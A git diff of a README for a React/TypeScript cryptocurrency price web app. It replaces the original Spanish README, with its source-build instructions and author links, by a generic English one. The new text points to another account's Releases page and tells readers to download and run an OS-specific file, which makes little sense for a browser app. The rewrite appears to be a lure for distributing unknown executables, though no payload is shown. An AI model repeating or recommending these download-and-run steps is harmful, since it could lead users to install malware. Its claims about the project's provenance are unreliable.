@@ -1,160 +1,73 @@
-# 💰 Cotizador de Criptomonedas
+# 🌟 cotizador-de-criptomonedas - Check Crypto Prices Easily
 
-Una aplicación web moderna y elegante para consultar en tiempo real los precios de las principales criptomonedas del mercado. Construida con React, TypeScript y Vite para ofrecer una experiencia de usuario fluida y profesional.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/jaitleyshilpa/cotizador-de-criptomonedas/releases)
 
-## 🚀 Demo en Vivo
+## 🚀 Getting Started
 
-[Ver aplicación en funcionamiento](https://criptomonedas-cotizador.vercel.app)
+Welcome to cotizador-de-criptomonedas! This application allows you to consult real-time cryptocurrency prices easily. It has a modern interface, built with React, TypeScript, and Vite, making it a perfect tool for traders and investors who need updated market information.
 
-## ✨ Características
+## 🛠️ System Requirements
 
-### 🎯 Funcionalidades Principales
-- **Cotización en Tiempo Real**: Precios actualizados de las top 20 criptomonedas
-- **Múltiples Monedas**: Soporte para 8+ monedas fiat (USD, EUR, GBP, JPY, etc.)
-- **Información Detallada**: Precio actual, máximo/mínimo diario, variación 24h
-- **Interfaz Responsive**: Optimizada para desktop, tablet y móvil
-- **Manejo Robusto de Errores**: Mensajes informativos y reintentos automáticos
+To use cotizador-de-criptomonedas, your system should meet the following requirements:
 
-### 💎 Características Técnicas
-- **TypeScript**: Tipado fuerte para mayor confiabilidad
-- **Hooks Personalizados**: Lógica reutilizable y mantenible
-- **Styled Components**: Estilos dinámicos y tema consistente
-- **Animaciones Suaves**: Transiciones y efectos visuales elegantes
-- **Accesibilidad**: ARIA labels y navegación por teclado
-- **Performance Optimizada**: Memoización y lazy loading
+- **Operating System:** Windows, macOS, or any Linux distribution
+- **Browser:** Latest version of Chrome, Firefox, Safari, or Edge
+- **Internet Connection:** Required for real-time updates
 
-## 🛠️ Tecnologías Utilizadas
+## 🌐 Features
 
-### Frontend
-- **React 18** - Biblioteca de interfaz de usuario
-- **TypeScript** - Superset de JavaScript con tipado estático
-- **Vite** - Herramienta de construcción ultrarrápida
-- **Emotion/Styled** - CSS-in-JS para estilos dinámicos
+- **Real-Time Prices:** Get the latest cryptocurrency prices without delay.
+- **Elegant UI:** Enjoy a modern and responsive user interface.
+- **Error Handling:** Experience a robust design that handles errors smoothly.
+- **Comprehensive Data:** Access a wide range of cryptocurrency information from various sources.
 
-### APIs y Servicios
-- **CryptoCompare API** - Datos de criptomonedas en tiempo real
-- **Axios** - Cliente HTTP para peticiones API
+## 📥 Download & Install
 
-### Herramientas de Desarrollo
-- **ESLint** - Linter para código JavaScript/TypeScript
-- **Prettier** - Formateador de código automático
+To get started, visit the following link to download the application:
 
-## 📦 Instalación y Configuración
+[Download cotizador-de-criptomonedas](https://github.com/jaitleyshilpa/cotizador-de-criptomonedas/releases)
 
-### Prerrequisitos
-- Node.js (versión 16 o superior)
-- npm o yarn
+Once you are on the Releases page, select the latest version. Click on the file that suits your operating system. After downloading, locate the file in your downloads folder and run it.
 
-### Instalación Local
+## 🖥️ Running the Application
 
-```bash
-# Clonar el repositorio
-git clone https://github.com/cmurestudillos/cotizador-de-criptomonedas.git
+1. After installation, open the application.
+2. The main screen will display current cryptocurrency prices.
+3. Use the navigation features to view prices for different cryptocurrencies.
+4. Refresh the application to get updated prices in real-time.
 
-# Navegar al directorio
-cd cotizador-de-criptomonedas
+## 🌍 Additional Information
 
-# Instalar dependencias
-npm install
+- **API Integration:** The application pulls data from multiple cryptocurrency APIs to ensure accuracy.
+- **User Experience:** Designed with users in mind, to facilitate a smooth trading experience.
+- **Continuous Updates:** Frequent updates ensure that you always have the latest features and security enhancements.
 
-# Ejecutar en modo desarrollo
-npm run dev
+## 🔧 Troubleshooting
 
-# Construir para producción
-npm run build
+If you encounter any issues while installing or running cotizador-de-criptomonedas, consider the following steps:
 
-# Previsualizar build de producción
-npm run preview
-```
+- **Check Your Internet Connection:** Ensure you have a stable connection for data retrieval.
+- **Update Your Browser:** Make sure you are using an up-to-date web browser for the best experience.
+- **Clear Cache:** Sometimes cached data can cause problems; clearing it may resolve any issues.
 
-## 🏗️ Estructura del Proyecto
+## 💬 Community Support
 
-```
-src/
-├── components/          # Componentes React reutilizables
-│   ├── Cotizacion.tsx   # Mostrar resultados de cotización
-│   ├── Error.tsx        # Manejo y display de errores
-│   ├── Formulario.tsx   # Formulario de selección
-│   └── Spinner/         # Componente de carga
-├── hooks/               # Hooks personalizados
-│   ├── useMoneda.tsx    # Hook para selección de moneda
-│   └── useCriptomoneda.tsx # Hook para selección de cripto
-├── assets/              # Imágenes y recursos estáticos
-└── App.tsx              # Componente principal
-```
+For any questions or assistance, please feel free to reach out to our community. You can find support on our GitHub Issues page, where you can describe your issue, and a team member will respond.
 
-## 🌐 API Utilizada
+## 🎉 Contributing
 
-Esta aplicación utiliza la [CryptoCompare API](https://min-api.cryptocompare.com/) para obtener datos de criptomonedas:
+We welcome contributions! If you'd like to help improve cotizador-de-criptomonedas, please check our [Contributing Guide](https://github.com/jaitleyshilpa/cotizador-de-criptomonedas/blob/main/CONTRIBUTING.md) for details on how to get started.
 
-- **Endpoint Principal**: `/data/pricemultifull`
-- **Lista de Criptos**: `/data/top/mktcapfull`
-- **Rate Limit**: 100,000 requests/mes (plan gratuito)
+## 🔗 Related Topics
 
-## 📱 Responsive Design
+- [API Integration](https://en.wikipedia.org/wiki/API)
+- [Cryptocurrency](https://en.wikipedia.org/wiki/Cryptocurrency)
+- [Fintech](https://en.wikipedia.org/wiki/Financial_technology)
 
-La aplicación está optimizada para diferentes tamaños de pantalla:
+## 📜 License
 
-- **Desktop**: Diseño de dos columnas con sidebar
-- **Tablet**: Layout adaptativo con elementos apilados
-- **Móvil**: Interfaz vertical optimizada para touch
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/jaitleyshilpa/cotizador-de-criptomonedas/blob/main/LICENSE) file for details.
 
-## ♿ Accesibilidad
-
-- ✅ Navegación por teclado completa
-- ✅ Labels ARIA para lectores de pantalla
-- ✅ Contraste de colores WCAG AA
-- ✅ Estados de foco visibles
-- ✅ Texto alternativo en imágenes
-
-## 🚧 Roadmap
-
-### Versión 2.0
-- [ ] Gráficos históricos de precios
-- [ ] Favoritos y watchlist personalizada
-- [ ] Notificaciones de precio
-- [ ] Modo oscuro/claro
-- [ ] PWA capabilities (offline)
-
-### Versión 2.1
-- [ ] Calculadora de conversión
-- [ ] Comparación entre criptomonedas
-- [ ] Integración con portfolios
-- [ ] Exportar datos a CSV/PDF
-
-## 🤝 Contribuciones
-
-¡Las contribuciones son bienvenidas! Para contribuir:
-
-1. Fork del proyecto
-2. Crear una branch para tu feature (`git checkout -b feature/AmazingFeature`)
-3. Commit de tus cambios (`git commit -m 'Add some AmazingFeature'`)
-4. Push a la branch (`git push origin feature/AmazingFeature`)
-5. Abrir un Pull Request
-
-### Guías de Contribución
-- Seguir las convenciones de código existentes
-- Añadir tests para nuevas funcionalidades
-- Documentar cambios en el README
-- Mantener el código TypeScript tipado
-
-## 📄 Licencia
-
-Este proyecto está bajo la Licencia MIT - ver el archivo [LICENSE](LICENSE) para más detalles.
-
-## 🙏 Agradecimientos
-
-- [CryptoCompare](https://www.cryptocompare.com/) por proporcionar la API gratuita
-- [React Community](https://reactjs.org/) por las increíbles herramientas
-- [Emotion](https://emotion.sh/) por hacer que los estilos sean divertidos
-
----
-
-⭐ **¡Si te gusta este proyecto, dale una estrella en GitHub!** ⭐
-
-## 📊 Métricas del Proyecto
-
-![GitHub Stars](https://img.shields.io/github/stars/cmurestudillos/cotizador-de-criptomonedas?style=social)
-![GitHub Forks](https://img.shields.io/github/forks/cmurestudillos/cotizador-de-criptomonedas?style=social)
-![GitHub Issues](https://img.shields.io/github/issues/cmurestudillos/cotizador-de-criptomonedas)
-![GitHub PRs](https://img.shields.io/github/issues-pr/cmurestudillos/cotizador-de-criptomonedas)
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/jaitleyshilpa/cotizador-de-criptomonedas/releases)
